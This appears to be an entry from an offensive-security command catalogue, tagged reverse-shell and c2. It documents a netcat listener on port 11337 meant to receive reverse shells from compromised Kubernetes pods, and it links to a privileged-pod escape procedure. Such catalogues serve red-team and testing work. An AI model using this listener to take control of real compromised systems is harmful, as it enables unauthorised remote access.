---
data: nc -kl 0.0.0.0 11337
tags:
  - reverse-shell
  - c2
type: command
output: Waiting for connection
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.863Z'
id: 05885dbc-7482-4951-aa92-efaa29790bf3
verified: false
validated: true
submitted: true
---
# nc-listen-for-reverse-shell

## Command

```bash
nc -kl 0.0.0.0 11337
```

## Description

Starts a netcat listener on port 11337 for receiving reverse shells from compromised pods.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-kl` | Keep open after connection, listen mode | Yes |
| `0.0.0.0 11337` | Bind to all interfaces on port 11337 | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

"Listening on [0.0.0.0] (family 0, port 11337)" then shell on connect.

## Related

- [[procedures/Escape-to-Host-via-Privileged-Pod]]
